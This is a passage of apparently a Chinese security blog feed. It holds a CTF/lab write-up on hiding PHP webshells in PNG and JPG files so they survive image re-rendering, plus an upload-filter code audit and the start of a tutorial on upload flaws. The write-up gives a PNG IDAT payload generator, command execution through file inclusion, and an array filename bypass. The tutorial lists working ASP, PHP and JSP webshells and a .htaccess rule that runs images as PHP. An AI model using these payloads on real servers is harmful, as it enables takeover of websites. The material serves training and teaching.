payload 的：</p><p><a href="https://image.3001.net/images/20201025/16036306183035.png"><img src="https://image.3001.net/images/20201025/16036306183035.png" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036307974999.png"><img src="https://image.3001.net/images/20201025/16036307974999.png" alt="img"></a></p><p>来检测一下我们的 payload 是否还存在了：</p><p><a href="https://image.3001.net/images/20201025/16036344921925.png"><img src="https://image.3001.net/images/20201025/16036344921925.png" alt="img"></a></p><p>哎貌似不对劲：</p><p><a href="https://image.3001.net/images/20201025/16036345974560.png"><img src="https://image.3001.net/images/20201025/16036345974560.png" alt="img"></a></p><p>这个字符串被渲染后貌似是顺序有点奇怪。这里国光踩了很多坑，查了很多资料网上都没有好的解决方案，最后国光<strong>将这个被目标网站渲染后的图片再上传渲染</strong>，下面是渲染后的图片：</p><p><a href="https://image.3001.net/images/20201025/16036348898441.png"><img src="https://image.3001.net/images/20201025/16036348898441.png" alt="img"></a></p><p>赶紧来查看一下里面是否包含图马信息：</p><p><a href="https://image.3001.net/images/20201025/16036348742287.png"><img src="https://image.3001.net/images/20201025/16036348742287.png" alt="img"></a></p><p>阿这！居然成功了，真的是功夫不负有心人呐，不枉国光我周末大半夜的在公司加班写的这篇文章了！！！泪目</p><h3 id="写入-IDAT-数据块"><a href="#写入-IDAT-数据块" class="headerlink" title="写入 IDAT 数据块"></a>写入 IDAT 数据块</h3><p>PNG 也是可以写入 IDAT 数据来绕过渲染的，由于快 23.00 了国光没有多余的时间研究里面细节了，这里直接引用了先知里面提供的一个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接运行生成会在脚本目录下生成 shell.png 图片，下面是生成好的 图片：</p><p><a href="https://image.3001.net/images/20201025/16036353722974.png"><img src="https://image.3001.net/images/20201025/16036353722974.png" alt="img"></a></p><p>其内容如下：</p><p><a href="https://image.3001.net/images/20201025/16036354976650.png"><img src="https://image.3001.net/images/20201025/16036354976650.png" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036356271476.png"><img src="https://image.3001.net/images/20201025/16036356271476.png" alt="img"></a></p><p>查看一下里面的 payload 是否还存在：</p><p><a href="https://image.3001.net/images/20201025/16036357015967.png"><img src="https://image.3001.net/images/20201025/16036357015967.png" alt="img"></a></p><p>依然存在的，成功绕过渲染 ，这里顺便提一下这个 shell 的使用方法，下面就不再补充了。</p><p>首先获取图片的上传地址为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/upload/357481464.png</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/1603635794598.png"><img src="https://image.3001.net/images/20201025/1603635794598.png" alt="img"></a></p><p>利用网站本身的文件包含漏洞，尝试直接包含这个图马 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?file=./upload/357481464.png</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/16036358617110.png"><img src="https://image.3001.net/images/20201025/16036358617110.png" alt="img"></a></p><p>貌似成功了，执行命令看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?0=system&amp;file=./upload/357481464.png</span><br></pre></td></tr></table></figure><p>POST 内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=<span class="built_in">cat</span> /f14a4a4a4a444g</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/16036360607524.png"><img src="https://image.3001.net/images/20201025/16036360607524.png" alt="img"></a></p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试。</p><p>这个脚本 Github 搜索一下很多项目都有这个脚本，这里国光就随便搜索拿了搜索结果第一个的项目放在本文中。</p><p><strong>项目地址</strong>：<a href="https://github.com/BlackFan/jpg_payload">Github - lackFan/jpg_payload</a></p><p>准备一个 jpg 图片：</p><p><a href="https://image.3001.net/images/20201026/16036693924901.jpg"><img src="https://image.3001.net/images/20201026/16036693924901.jpg" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201026/1603669426842.jpg"><img src="https://image.3001.net/images/20201026/1603669426842.jpg" alt="img"></a></p><p>接着使用脚本来插入 payload，如果想要修改默认 payload 的话，自行修改脚本中的下部分代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后运行脚本插入 payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php jpg_payload.php 122728342.jpg</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><p>生成的新图片为：</p><p><a href="https://image.3001.net/images/20201026/16036747206733.jpg"><img src="https://image.3001.net/images/20201026/16036747206733.jpg" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201026/1603674733221.jpg"><img src="https://image.3001.net/images/20201026/1603674733221.jpg" alt="img"></a></p><p>那么来查看一下最终这个 JPG 里面是否带有 payload 信息：</p><p><a href="https://image.3001.net/images/20201026/16036748931486.png"><img src="https://image.3001.net/images/20201026/16036748931486.png" alt="img"></a></p><p>无疑写 phpinfo () 是很容易成功的，但是 phpinfo () 并无实质性危害，我们需要插入真正的 webshell 才可以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这里非常玄学，在国光经历了不知道多少次失败后，才成功将上面的 payload 完整插入</p></blockquote><p><a href="https://image.3001.net/images/20201026/1603675937154.jpg"><img src="https://image.3001.net/images/20201026/1603675937154.jpg" alt="img"></a></p><p>这个图马被 imagecreatefromjpeg 渲染后如下：</p><p><a href="https://image.3001.net/images/20201026/16036760334176.jpg"><img src="https://image.3001.net/images/20201026/16036760334176.jpg" alt="img"></a></p><p>查看一下 payload 是否存在：</p><p><a href="https://image.3001.net/images/20201026/16036761717904.png"><img src="https://image.3001.net/images/20201026/16036761717904.png" alt="img"></a></p><p>完美，尝试直接文件包含来执行攻击语句试试看：</p><p><a href="https://image.3001.net/images/20201026/16036764145479.png"><img src="https://image.3001.net/images/20201026/16036764145479.png" alt="img"></a></p><p><strong>JPG 坑点总结</strong></p><ol><li>需要被 imagecreatefromjpeg 渲染或再用工具</li><li>图片找的稍微大一点 成功率更高</li><li>Payload 语句越短成功率越高</li><li>一张图片不行就换一张 不要死磕</li><li>国光补充：貌似白色的图片成功率也比较高</li><li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种 payload 成功率很高</li></ol><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>代码审计这一题如果可以动态调试的话，那么理解起来就会比较简单：</p><p><a href="https://image.3001.net/images/20201026/16036775446476.png"><img src="https://image.3001.net/images/20201026/16036775446476.png" alt="img"></a></p><p>这个题目是直接 copy Upload-labs 里面的最后一关，这个貌似还是后面新增的题目，下面是核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上最后一关和上传关系不大，这个题主要考查 PHP 代码审计，关于代码审计的题目实际上 XDebug 动态调试一下就可以很轻松的做出来，关于 XDebug 的配置文章可以参考国光我之前写的两篇文章：</p><ul><li><a href="https://www.sqlsec.com/2020/07/macphp.html">国光 - macOS 下优雅地配置 PHP 代码审计环境</a></li><li><a href="https://www.sqlsec.com/2020/09/xdebug.html">国光 - Xdebug + 宝塔 + PHPStudy+VScode PHP</a></li></ul><p>首先看第一个判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以必须保证我们上传的表单 MIME 类型一定要符合标准。</p><p>接着对我们提交的 sava_name 的字符串进行处理，如果不是数组的话就以 <code>.</code> 为分隔，打散为数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是<strong>数组的话就无需打散</strong>，这里比较关键，后面再详细说，先记着。</p><p>因为打散后会校验最后的后缀：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是合法后缀的话直接就报错了，所以我们老老实实的传入合法的字符串类型的不行的，这里的传入一个数组。比如这样的数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = [<span class="number">0</span>=&gt;<span class="string">&#x27;shell.php/&#x27;</span>, <span class="number">2</span>=&gt;<span class="string">&#x27;png&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这样执行完最后的拼接文件名的代码后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="string">&#x27;shell.php/&#x27;</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="number">2</span> - <span class="number">1</span>]; = <span class="string">&#x27;shell.php/&#x27;</span>.<span class="string">&#x27;&#x27;</span> = <span class="string">&#x27;shell.php/.&#x27;</span></span><br></pre></td></tr></table></figure><p>这样最后一步：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">PHPmove_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="string">&#x27;xx/xx/shell/php/.&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>结合前面的 move_uploaded_file 函数缺陷，会忽略掉文件末尾的 <code>/.</code>，所以最终就可以成功将 webshell 上传。</p><p>那么最终构造的数据包如下：</p><p><img src="https://image.3001.net/images/20201026/16036832903333.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 密码爆破 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - 文件上传漏洞</title>
      <link href="/post/17553.html/"/>
      <url>/post/17553.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如<strong>企业的OA系统，允许用户上传图片、视频、头像和许多其他类D的文件</strong>。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在文件上传漏洞，那么恶意用户就可以<strong>利用文件上传漏洞将可执行脚本程序(WebShell)上传到服务器中，获得网站的权限</strong>，然后可以<strong>进一步对服务器进行入侵</strong>，扩大控制权限。</p><h3 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h3><p>上传文件时，如果服务端代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以<strong>上传任意文件</strong>的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。</p><h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><p>非法用户可以利用<strong>上传的恶意脚本文件控制整个网站，甚至控制服务器</strong>。这个恶意的脚本文件，又被称为<strong>WebShell</strong>，也可将<strong>WebShell脚本称为一种网页后门</strong>, WebShell脚本具有非常强大的<strong>功能</strong>，比如<strong>查看服务器目录、服务器中的文件，执行系统命令</strong>等。<br>WebShell 就是以ASP、PHP、JSP等网页脚本存在的一种命令执行环节，通常也叫做<strong>网页后门</strong>。攻击者在<strong>入侵了一个网站后</strong>，通常<strong>会将WebShell上传到网站的根目录下或者插入到正常的网页中</strong>，然后<strong>使用浏览器或者对应的WebShell客户端来访问这些后门，将会得到一个命令执行的环境，以达到控制网站服务器的目的。</strong></p><h2 id="不同类型漏洞代码"><a href="#不同类型漏洞代码" class="headerlink" title="不同类型漏洞代码"></a>不同类型漏洞代码</h2><ul><li><p>ASP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;x&quot;)%&gt;</span><br></pre></td></tr></table></figure></li><li><p>ASPX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item [&quot;x&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure></li><li><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])；<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>JSP CMD WebShell</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;x&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">java.io.InputStream in=Runtime,getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInp inta=-<span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span>[]b=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))！=-<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>)；</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="上传漏洞攻击满足的条件"><a href="#上传漏洞攻击满足的条件" class="headerlink" title="上传漏洞攻击满足的条件"></a>上传漏洞攻击满足的条件</h2></li></ul><ol><li>上传的文件<strong>能够被Web容器解释执行</strong>。所以文件上传后<strong>所在的目录要是Web容器所覆盖到的路径</strong>。</li><li>用户能够<strong>从 Web上访问这个文件</strong>。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也不能称之为漏洞。</li><li>查看上传的文件是否被<strong>安全检查、格式化、图片压缩</strong>，改变了内容，则也可能导致攻击不成功。</li></ol><h2 id="中国蚁剑：antsword-使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑：antsword-使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑：antsword 使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑：antsword 使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件上传题目"><a href="#文件上传题目" class="headerlink" title="文件上传题目"></a>文件上传题目</h2><h3 id="1-JS-永远不要相信用户的输入"><a href="#1-JS-永远不要相信用户的输入" class="headerlink" title="1. JS - 永远不要相信用户的输入"></a>1. JS - 永远不要相信用户的输入</h3><p>“永远不要相信用户的输入”是进行安全设计和安全编码的重要准则。换句话说，任何输入数据在证明其无害之前，都是有害的。许多危险的漏洞就是因为过于相信用户的输入是善意的而导致的。</p><ol><li>禁用JS</li><li><strong>BP改包</strong></li><li>JS调试</li><li><p>使用 BP 修改返回包内容</p><h3 id="2-解析规则-Apache-中-htaccess"><a href="#2-解析规则-Apache-中-htaccess" class="headerlink" title="2.解析规则 - Apache 中 .htaccess"></a>2.解析规则 - Apache 中 .htaccess</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></li></ol><ul><li>White白名单：只允许某些类型的文件上传</li><li>Blacklist黑名单列表：不允许某些类型文件上传</li><li><strong>把png当做木马解析  然后就能解析到图</strong>片</li><li><strong>设置解析规则命令</strong><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat <span class="string">.htaccess</span></span><br><span class="line">AddType application/ x-httpd-php <span class="string">.png</span></span><br></pre></td></tr></table></figure><h3 id="3-MIME-媒体类型"><a href="#3-MIME-媒体类型" class="headerlink" title="3.MIME - 媒体类型"></a>3.MIME - 媒体类型</h3>媒体类型（通常称为MultipurposeInternetMalExtensions 或MNE类型）是一种标准，用来表示文档、文件或字节流的性质和格式。</li><li>MNE的组成结构非常简单﹔由类型与子类型两个字符串中间用′分隔而组成。不允许空格存在。type表示可以被分多个子类的独立类别。subtype表示细分后的每个类型。</li><li>通用结构:type/subtype</li><li><strong>方法：修改图片类型，或者修改后缀</strong></li></ul><h3 id="4-文件头-文件头绕过"><a href="#4-文件头-文件头绕过" class="headerlink" title="4.文件头 - 文件头绕过"></a>4.文件头 - 